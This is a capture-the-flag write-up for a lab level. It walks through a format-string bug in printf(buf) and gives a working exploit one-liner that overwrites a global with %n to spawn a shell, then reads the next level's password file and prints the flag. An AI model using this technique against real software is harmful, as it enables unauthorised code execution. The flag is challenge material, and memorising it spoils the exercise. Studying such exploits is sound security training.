# Level 3

**Vulnerability:** Format string (`printf(buf)`) → arbitrary write with `%n`.

## Walkthrough

`v()` reads input with `fgets` then calls `printf(buf)` directly (no `"%s"`), so our
format specifiers are interpreted. If the global `m` (at `0x0804988c`) equals `0x40`,
it runs `system("/bin/sh")`.

Our buffer appears at **stack position 4** (`%4$x` prints `41414141` for input `AAAA`).

The plan: place `m`'s address at the start of the buffer, print exactly `0x40 = 64`
characters, then use `%4$n` to write that count into `m`.

- `\x8c\x98\x04\x08` — address of `m` (4 chars printed)
- `%60x` — pads output to reach 64 total
- `%4$n` — writes 64 into `m`

## Exploit

```sh
(printf '\x8c\x98\x04\x08%%60x%%4$n'; cat) | ./level3
cat /home/user/level4/.pass
```

**Flag:** `b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa`
